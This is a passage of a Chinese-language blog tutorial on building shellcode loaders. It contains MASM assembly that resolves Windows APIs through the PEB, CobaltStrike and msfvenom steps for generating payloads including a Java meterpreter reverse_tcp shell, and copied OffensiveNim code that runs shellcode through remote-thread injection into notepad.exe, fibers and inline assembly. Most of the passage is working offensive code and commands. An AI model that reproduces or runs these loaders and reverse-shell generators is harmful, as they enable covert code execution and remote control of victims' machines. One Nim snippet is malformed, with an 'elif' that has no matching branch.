eax,fs:[ecx+30h]</span><br><span class="line">  mov eax, [eax+0Ch]</span><br><span class="line">  mov esi, [eax+14h]</span><br><span class="line">  lodsd</span><br><span class="line">  xchg eax, esi</span><br><span class="line">  lodsd</span><br><span class="line">  mov ebx,[eax+10h]</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">Get_Function:</span><br><span class="line">  mov edx,[ebx+3ch]</span><br><span class="line">  add edx,ebx</span><br><span class="line">  mov edx, [edx+78h]</span><br><span class="line">  add edx, ebx</span><br><span class="line">  mov esi, [edx+20h]</span><br><span class="line">  add esi, ebx</span><br><span class="line">  xor ecx,ecx</span><br><span class="line">  getfunc:inc ecx</span><br><span class="line">  lodsd</span><br><span class="line">  add eax,ebx</span><br><span class="line">  cmp DWORD PTR [eax], 50746547h</span><br><span class="line">  jnz getfunc</span><br><span class="line">  cmp DWORD PTR [eax+4], 41636f72h</span><br><span class="line">  jnz getfunc</span><br><span class="line">  mov esi, [edx+24h]</span><br><span class="line">  add esi, ebx</span><br><span class="line">  mov cx, [esi + ecx * 2]</span><br><span class="line">  dec ecx</span><br><span class="line">  mov esi, [edx+1ch]</span><br><span class="line">  add esi, ebx</span><br><span class="line">  mov edx, [esi + ecx * 4]</span><br><span class="line">  add edx, ebx</span><br><span class="line">  ret </span><br><span class="line"></span><br><span class="line">Decode:</span><br><span class="line">  mov ebx,[esp+4]</span><br><span class="line">  call Strlen</span><br><span class="line">  x:mov AL, BYTE  PTR [ebx + ecx - 1]</span><br><span class="line">  inc AL</span><br><span class="line">  mov BYTE PTR [ebx + ecx - 1], AL</span><br><span class="line">  loop x</span><br><span class="line">  ret 4</span><br><span class="line"></span><br><span class="line">Strlen:</span><br><span class="line">  xor ecx,ecx</span><br><span class="line">  mov esi,[esp+8]</span><br><span class="line">  s:lodsb</span><br><span class="line">  inc ecx</span><br><span class="line">  cmp AL,0</span><br><span class="line">  jnz s</span><br><span class="line">  dec ecx</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">END _START</span><br></pre></td></tr></table></figure>
+
+<h4 id="编译代码为可执行文件"><a href="#编译代码为可执行文件" class="headerlink" title="编译代码为可执行文件"></a>编译代码为可执行文件</h4><ul>
+<li><p>下载<a href="/302.html?target=https://masm32.com">MASM32</a></p>
+</li>
+<li><p>通过汇编代码编译为obj文件</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ml /c /coff /Cp masm.asm</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过obj文件编译为exe文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link /subsystem:windows masm.obj</span><br></pre></td></tr></table></figure>
+
+<h2 id="Java语言ShellCode"><a href="#Java语言ShellCode" class="headerlink" title="Java语言ShellCode"></a>Java语言ShellCode</h2><h3 id="CobaltStrike生成ShellCode-2"><a href="#CobaltStrike生成ShellCode-2" class="headerlink" title="CobaltStrike生成ShellCode"></a>CobaltStrike生成ShellCode</h3><h4 id="Windows-x86-7"><a href="#Windows-x86-7" class="headerlink" title="Windows x86"></a>Windows x86</h4><ul>
+<li><p><code>攻击</code>-&gt;<code>生成后门</code>-&gt;<code>Payload生成器</code></p>
+</li>
+<li><p>选择<code>监听器</code>，<code>输出格式</code>选择<code>Java</code>，<code>x64</code>取消勾选<code>使用x64 payload</code>-&gt;<code>生成</code></p>
+</li>
+<li><p>得到后缀名为<code>.jar</code>的文件</p>
+</li>
+</ul>
+<h4 id="Windows-x64-8"><a href="#Windows-x64-8" class="headerlink" title="Windows x64"></a>Windows x64</h4><ul>
+<li><p><code>攻击</code>-&gt;<code>生成后门</code>-&gt;<code>Payload生成器</code></p>
+</li>
+<li><p>选择<code>监听器</code>，<code>输出格式</code>选择<code>Java</code>，<code>x64</code>勾选<code>使用x64 payload</code>-&gt;<code>生成</code></p>
+</li>
+<li><p>得到后缀名为<code>.jar</code>的文件</p>
+</li>
+</ul>
+<h3 id="msf生成ShellCode-5"><a href="#msf生成ShellCode-5" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f jar -o x.jar</span><br></pre></td></tr></table></figure>
+
+<h2 id="Nim语言ShellCode"><a href="#Nim语言ShellCode" class="headerlink" title="Nim语言ShellCode"></a>Nim语言ShellCode</h2><h3 id="byt3bl33d3r-OffensiveNim-shellcode-bin"><a href="#byt3bl33d3r-OffensiveNim-shellcode-bin" class="headerlink" title="byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_bin"></a>byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_bin</h3><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/byt3bl33d3r/OffensiveNim/refs/heads/master/src/shellcode_bin.nim">传送门</a></p>
+<h4 id="msf生成ShellCode-6"><a href="#msf生成ShellCode-6" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h4><ul>
+<li>生成结果形如</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">byte[] buf = new byte[322] &#123;0xfc,0x48,0x81,0xe4,0xf0,0xff,</span><br><span class="line">0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,</span><br><span class="line">0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,</span><br><span class="line">0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,</span><br><span class="line">0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,</span><br><span class="line">0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,</span><br><span class="line">0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,</span><br><span class="line">0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,</span><br><span class="line">0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,</span><br><span class="line">0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,</span><br><span class="line">0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,</span><br><span class="line">0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,</span><br><span class="line">0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,</span><br><span class="line">0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,</span><br><span class="line">0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,</span><br><span class="line">0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,</span><br><span class="line">0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,</span><br><span class="line">0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,</span><br><span class="line">0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,</span><br><span class="line">0x3e,0x48,0x8d,0x8d,0x2a,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,</span><br><span class="line">0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,</span><br><span class="line">0x48,0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1f,</span><br><span class="line">0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,</span><br><span class="line">0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,</span><br><span class="line">0xd5,0x48,0x65,0x6c,0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,</span><br><span class="line">0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,</span><br><span class="line">0x65,0x42,0x6f,0x78,0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,</span><br><span class="line">0x64,0x6c,0x6c,0x00&#125;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/messagebox LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f csharp</span><br></pre></td></tr></table></figure>
+
+<h5 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/messagebox LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f csharp</span><br></pre></td></tr></table></figure>
+
+<h4 id="ShellCode执行器"><a href="#ShellCode执行器" class="headerlink" title="ShellCode执行器"></a>ShellCode执行器</h4><h5 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h5><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> winim/lean</span><br><span class="line"><span class="keyword">import</span> osproc</span><br><span class="line"></span><br><span class="line"><span class="keyword">proc</span> injectCreateRemoteThread[I, T](shellcode: <span class="type">array</span>[I, T]): <span class="type">void</span> =</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Under the hood, the startProcess function from Nim&#x27;s osproc module is calling CreateProcess() :D</span></span><br><span class="line">    <span class="keyword">let</span> tProcess = startProcess(<span class="string">&quot;notepad.exe&quot;</span>)</span><br><span class="line">    tProcess.suspend() <span class="comment"># That&#x27;s handy!</span></span><br><span class="line">    defer: tProcess.close()</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] Target Process: &quot;</span>, tProcess.processID</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> pHandle = <span class="type">OpenProcess</span>(</span><br><span class="line">        <span class="type">PROCESS_ALL_ACCESS</span>, </span><br><span class="line">        <span class="literal">false</span>, </span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">DWORD</span>](tProcess.processID)</span><br><span class="line">    )</span><br><span class="line">    defer: <span class="type">CloseHandle</span>(pHandle)</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] pHandle: &quot;</span>, pHandle</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> rPtr = <span class="type">VirtualAllocEx</span>(</span><br><span class="line">        pHandle,</span><br><span class="line">        <span class="type">NULL</span>,</span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len),</span><br><span class="line">        <span class="type">MEM_COMMIT</span>,</span><br><span class="line">        <span class="type">PAGE_EXECUTE_READ_WRITE</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bytesWritten: <span class="type">SIZE_T</span></span><br><span class="line">    <span class="keyword">let</span> wSuccess = <span class="type">WriteProcessMemory</span>(</span><br><span class="line">        pHandle, </span><br><span class="line">        rPtr,</span><br><span class="line">        unsafeAddr shellcode,</span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len),</span><br><span class="line">        <span class="keyword">addr</span> bytesWritten</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] WriteProcessMemory: &quot;</span>, <span class="type">bool</span>(wSuccess)</span><br><span class="line">    echo <span class="string">&quot;    \\-- bytes written: &quot;</span>, bytesWritten</span><br><span class="line">    echo <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> tHandle = <span class="type">CreateRemoteThread</span>(</span><br><span class="line">        pHandle, </span><br><span class="line">        <span class="type">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">LPTHREAD_START_ROUTINE</span>](rPtr),</span><br><span class="line">        <span class="type">NULL</span>, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="type">NULL</span></span><br><span class="line">    )</span><br><span class="line">    defer: <span class="type">CloseHandle</span>(tHandle)</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] tHandle: &quot;</span>, tHandle</span><br><span class="line">    echo <span class="string">&quot;[+] Injected&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">when</span> defined(windows):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> defined(i386):</span><br><span class="line">        echo <span class="string">&quot;[*] Running in x86 process&quot;</span></span><br><span class="line">        <span class="keyword">var</span> shellcode: <span class="type">array</span>[<span class="number">4</span>, byte] = [</span><br><span class="line">        byte <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> isMainModule:</span><br><span class="line">        injectCreateRemoteThread(shellcode)</span><br></pre></td></tr></table></figure>
+
+<h5 id="x64-1"><a href="#x64-1" class="headerlink" title="x64"></a>x64</h5><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[</span></span><br><span class="line">    <span class="type">Author</span>: <span class="type">Marcello</span> <span class="type">Salvati</span>, <span class="type">Twitter</span>: @byt3bl33d3r</span><br><span class="line">    <span class="type">License</span>: <span class="type">BSD</span> <span class="number">3</span>-<span class="type">Clause</span></span><br><span class="line">]<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> winim/lean</span><br><span class="line"><span class="keyword">import</span> osproc</span><br><span class="line"></span><br><span class="line"><span class="keyword">proc</span> injectCreateRemoteThread[I, T](shellcode: <span class="type">array</span>[I, T]): <span class="type">void</span> =</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Under the hood, the startProcess function from Nim&#x27;s osproc module is calling CreateProcess() :D</span></span><br><span class="line">    <span class="keyword">let</span> tProcess = startProcess(<span class="string">&quot;notepad.exe&quot;</span>)</span><br><span class="line">    tProcess.suspend() <span class="comment"># That&#x27;s handy!</span></span><br><span class="line">    defer: tProcess.close()</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] Target Process: &quot;</span>, tProcess.processID</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> pHandle = <span class="type">OpenProcess</span>(</span><br><span class="line">        <span class="type">PROCESS_ALL_ACCESS</span>, </span><br><span class="line">        <span class="literal">false</span>, </span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">DWORD</span>](tProcess.processID)</span><br><span class="line">    )</span><br><span class="line">    defer: <span class="type">CloseHandle</span>(pHandle)</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] pHandle: &quot;</span>, pHandle</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> rPtr = <span class="type">VirtualAllocEx</span>(</span><br><span class="line">        pHandle,</span><br><span class="line">        <span class="type">NULL</span>,</span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len),</span><br><span class="line">        <span class="type">MEM_COMMIT</span>,</span><br><span class="line">        <span class="type">PAGE_EXECUTE_READ_WRITE</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bytesWritten: <span class="type">SIZE_T</span></span><br><span class="line">    <span class="keyword">let</span> wSuccess = <span class="type">WriteProcessMemory</span>(</span><br><span class="line">        pHandle, </span><br><span class="line">        rPtr,</span><br><span class="line">        unsafeAddr shellcode,</span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len),</span><br><span class="line">        <span class="keyword">addr</span> bytesWritten</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] WriteProcessMemory: &quot;</span>, <span class="type">bool</span>(wSuccess)</span><br><span class="line">    echo <span class="string">&quot;    \\-- bytes written: &quot;</span>, bytesWritten</span><br><span class="line">    echo <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> tHandle = <span class="type">CreateRemoteThread</span>(</span><br><span class="line">        pHandle, </span><br><span class="line">        <span class="type">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="keyword">cast</span>[<span class="type">LPTHREAD_START_ROUTINE</span>](rPtr),</span><br><span class="line">        <span class="type">NULL</span>, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="type">NULL</span></span><br><span class="line">    )</span><br><span class="line">    defer: <span class="type">CloseHandle</span>(tHandle)</span><br><span class="line"></span><br><span class="line">    echo <span class="string">&quot;[*] tHandle: &quot;</span>, tHandle</span><br><span class="line">    echo <span class="string">&quot;[+] Injected&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">when</span> defined(windows):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> defined(amd64):</span><br><span class="line">        echo <span class="string">&quot;[*] Running in x64 process&quot;</span></span><br><span class="line">        <span class="keyword">var</span> shellcode: <span class="type">array</span>[<span class="number">4</span>, byte] = [</span><br><span class="line">        byte <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> isMainModule:</span><br><span class="line">        injectCreateRemoteThread(shellcode)</span><br></pre></td></tr></table></figure>
+
+<h3 id="byt3bl33d3r-OffensiveNim-shellcode-fiber"><a href="#byt3bl33d3r-OffensiveNim-shellcode-fiber" class="headerlink" title="byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_fiber"></a>byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_fiber</h3><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/byt3bl33d3r/OffensiveNim/refs/heads/master/src/shellcode_fiber.nim">传送门</a></p>
+<h4 id="msf生成ShellCode-7"><a href="#msf生成ShellCode-7" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h4><p><a href="#msf%E7%94%9F%E6%88%90ShellCode-5">传送门</a></p>
+<h4 id="ShellCode执行器-1"><a href="#ShellCode执行器-1" class="headerlink" title="ShellCode执行器"></a>ShellCode执行器</h4><h5 id="x86-2"><a href="#x86-2" class="headerlink" title="x86"></a>x86</h5><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> winim/lean</span><br><span class="line"><span class="keyword">import</span> osproc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">proc</span> <span class="type">RunFiber</span>[I, T](shellcode: <span class="type">array</span>[I, T]): <span class="type">void</span> =</span><br><span class="line">    <span class="keyword">let</span> <span class="type">MasterFiber</span> = <span class="type">ConvertThreadToFiber</span>(<span class="type">NULL</span>)</span><br><span class="line">    <span class="keyword">let</span> vAlloc = <span class="type">VirtualAlloc</span>(<span class="type">NULL</span>, <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len), <span class="type">MEM_COMMIT</span>, <span class="type">PAGE_EXECUTE_READ_WRITE</span>)</span><br><span class="line">    <span class="keyword">var</span> bytesWritten: <span class="type">SIZE_T</span></span><br><span class="line">    <span class="keyword">let</span> pHandle = <span class="type">GetCurrentProcess</span>()</span><br><span class="line">    <span class="type">WriteProcessMemory</span>( pHandle, vAlloc, unsafeaddr shellcode, <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len), <span class="keyword">addr</span> bytesWritten)</span><br><span class="line">    <span class="keyword">let</span> xFiber = <span class="type">CreateFiber</span>(<span class="number">0</span>, <span class="keyword">cast</span>[<span class="type">LPFIBER_START_ROUTINE</span>](vAlloc), <span class="type">NULL</span>)</span><br><span class="line">    <span class="type">SwitchToFiber</span>(xFiber)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">when</span> defined(windows):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> defined(i386):</span><br><span class="line">        echo <span class="string">&quot;[*] Running in x86 process&quot;</span></span><br><span class="line">        <span class="keyword">var</span> shellcode: <span class="type">array</span>[<span class="number">4</span>, byte] = [</span><br><span class="line">        byte <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> isMainModule:</span><br><span class="line">        <span class="type">RunFiber</span>(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="x64-2"><a href="#x64-2" class="headerlink" title="x64"></a>x64</h5><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> winim/lean</span><br><span class="line"><span class="keyword">import</span> osproc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">proc</span> <span class="type">RunFiber</span>[I, T](shellcode: <span class="type">array</span>[I, T]): <span class="type">void</span> =</span><br><span class="line">    <span class="keyword">let</span> <span class="type">MasterFiber</span> = <span class="type">ConvertThreadToFiber</span>(<span class="type">NULL</span>)</span><br><span class="line">    <span class="keyword">let</span> vAlloc = <span class="type">VirtualAlloc</span>(<span class="type">NULL</span>, <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len), <span class="type">MEM_COMMIT</span>, <span class="type">PAGE_EXECUTE_READ_WRITE</span>)</span><br><span class="line">    <span class="keyword">var</span> bytesWritten: <span class="type">SIZE_T</span></span><br><span class="line">    <span class="keyword">let</span> pHandle = <span class="type">GetCurrentProcess</span>()</span><br><span class="line">    <span class="type">WriteProcessMemory</span>( pHandle, vAlloc, unsafeaddr shellcode, <span class="keyword">cast</span>[<span class="type">SIZE_T</span>](shellcode.len), <span class="keyword">addr</span> bytesWritten)</span><br><span class="line">    <span class="keyword">let</span> xFiber = <span class="type">CreateFiber</span>(<span class="number">0</span>, <span class="keyword">cast</span>[<span class="type">LPFIBER_START_ROUTINE</span>](vAlloc), <span class="type">NULL</span>)</span><br><span class="line">    <span class="type">SwitchToFiber</span>(xFiber)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">when</span> defined(windows):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> defined(amd64):</span><br><span class="line">        echo <span class="string">&quot;[*] Running in x64 process&quot;</span></span><br><span class="line">        <span class="keyword">var</span> shellcode: <span class="type">array</span>[<span class="number">4</span>, byte] = [</span><br><span class="line">        byte <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">when</span> isMainModule:</span><br><span class="line">        <span class="type">RunFiber</span>(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="byt3bl33d3r-OffensiveNim-shellcode-inline-asm-bin"><a href="#byt3bl33d3r-OffensiveNim-shellcode-inline-asm-bin" class="headerlink" title="byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_inline_asm_bin"></a>byt3bl33d3r&#x2F;OffensiveNim&#x2F;shellcode_inline_asm_bin</h3><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/byt3bl33d3r/OffensiveNim/refs/heads/master/src/shellcode_inline_asm_bin.nim">传送门</a></p>
+<h4 id="生成C-的ShellCode"><a href="#生成C-的ShellCode" class="headerlink" title="生成C#的ShellCode"></a>生成C#的ShellCode</h4><p><a href="#msf%E7%94%9F%E6%88%90ShellCode-4">传送门</a></p>
+<h4 id="ShellCode执行器-2"><a href="#ShellCode执行器-2" class="headerlink" title="ShellCode执行器"></a>ShellCode执行器</h4><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">proc</span> runsc(): <span class="type">void</span> =</span><br><span class="line">    <span class="keyword">asm</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .byte 0x00,0x00,0x00,0x00</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">runsc()</span><br></pre></td></tr></table></figure>
+
